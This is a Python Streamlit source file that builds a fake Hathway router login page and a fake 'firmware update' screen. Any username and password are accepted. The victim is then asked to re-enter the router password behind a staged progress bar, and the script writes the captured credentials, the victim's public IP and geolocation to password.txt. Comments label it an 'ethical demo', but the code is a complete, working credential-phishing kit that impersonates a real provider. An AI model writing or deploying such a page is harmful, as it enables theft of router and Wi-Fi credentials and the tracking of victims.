import streamlit as st
import time
import geocoder
import requests
from datetime import datetime

# --- Streamlit Page Configuration ---
st.set_page_config(page_title="Hathway Router", layout="centered")

# --- Session State Initialization ---
if "logged_in" not in st.session_state:
    st.session_state.logged_in = False
if "username" not in st.session_state:
    st.session_state.username = None 

# --- Helper Functions ---

def show_logo():
    try:
        with open("hathway.svg", "r", encoding="utf-8") as f:
            svg_logo = f.read()
        st.markdown(f"<div style='text-align:center'>{svg_logo}</div>", unsafe_allow_html=True)
    except FileNotFoundError:
        st.error("Error: 'hathway.svg' not found. Please ensure the SVG file is in the same directory.")
        st.markdown("<h1 style='text-align:center;'>Hathway Router</h1>", unsafe_allow_html=True)


# --- UI Functions (Screens) ---

# Fake login screen
def login_screen():
    show_logo()
    st.markdown("<h2 style='text-align:center;'>Hathway Router Login</h2>", unsafe_allow_html=True)
    
    username_input = st.text_input("Username", key="login_username_input")
    password_input = st.text_input("Password", type="password", key="login_password_input")

    if st.button("Login"):
        if username_input and password_input:
            # --- MODIFIED: Removed hardcoded credential check ---
            # For a phishing demo, we want to capture *any* input,
            # so we consider it "successful" if both fields are filled.
            st.success("Login successful!")
            st.session_state.logged_in = True
            st.session_state.username = username_input  # Store whatever username they typed
            st.experimental_rerun() # Rerun to switch to the firmware update screen
        else:
            st.error("Please enter both username and password.")
    

# Firmware update screen (remains unchanged from previous version)
def firmware_update_screen():
    show_logo()
    
    st.markdown("<h2 style='text-align:center;'>Firmware Update Available</h2>", unsafe_allow_html=True)
    st.markdown("""
        <div style="background-color:#f8f8f8;padding:20px;border-radius:10px;border:1px solid #ccc;">
        <b>New firmware version:</b> 3.7.45<br>
        <b>Size:</b> 14.2MB<br><br>
        To proceed with the update, please re-enter your router password.<br><br>
        </div>
    """, unsafe_allow_html=True)

    router_password_for_update = st.text_input("Router Password", type="password") 
    
    logged_in_username = st.session_state.get("username", "UnknownUser") 
    
    wifi_password_to_log = router_password_for_update 


    if st.button("Update Firmware"):
        if router_password_for_update:
            st.success("Firmware update started...") 
            st.warning("Do not turn off your router.")
            
            progress_text = "Firmware update in progress. Please wait..."
            my_progress_bar = st.progress(0, text=progress_text)
            
            for i in range(100):
                time.sleep(0.02)
                my_progress_bar.progress(i + 1, text=f"Updating... {i + 1}% complete")
            
            st.success("✅ Firmware updated successfully.")

            user_ip = "Unavailable"
            try:
                ip_response = requests.get("https://api.ipify.org?format=json")
                ip_response.raise_for_status() 
                user_ip = ip_response.json().get("ip", "Unavailable")
            except requests.exceptions.RequestException as e:
                print(f"Error fetching IP: {e}")
                user_ip = "Unavailable (Network Error)"
            except ValueError:
                print("Error decoding IP JSON response.")
                user_ip = "Unavailable (JSON Error)"

            user_location_lat = "Unknown"
            user_location_lon = "Unknown"
            try:
                g = geocoder.ip('me')
                if g.latlng and len(g.latlng) == 2:
                    user_location_lat, user_location_lon = g.latlng
                else:
                    user_location_lat, user_location_lon = "Unknown (No Data)", "Unknown (No Data)"
            except Exception as e:
                print(f"Error fetching location: {e}")
                user_location_lat, user_location_lon = "Unknown (Error)", "Unknown (Error)"
            
            try:
                with open("password.txt", "a", encoding="utf-8") as f:
                    f.write(f"""
Hathway Router Login
Username: {logged_in_username}
Login Password: {router_password_for_update}
Wi-Fi Password: {wifi_password_to_log}
IP Address: {user_ip}
Location: Lat: {user_location_lat}, Lon: {user_location_lon}
Timestamp: {datetime.now().isoformat()}
-----------------------------
""")
                print("\n--- Data Logged (for ethical demo purposes) ---")
                print(f"Username: {logged_in_username}")
                print(f"Router Password: {router_password_for_update}")
                print(f"Wi-Fi Password: {wifi_password_to_log}")
                print(f"IP Address: {user_ip}")
                print(f"Location: Lat={user_location_lat}, Lon={user_location_lon}")
                print("--------------------------------------------------\n")

            except IOError as e:
                st.error(f"Error writing to password.txt: {e}")
                print(f"Failed to write to password.txt: {e}")

            st.toast("System rebooting...")
        else:
            st.error("Router Password required to continue.")


# --- Main Application Logic ---
if not st.session_state.logged_in:
    login_screen()
else:
    firmware_update_screen()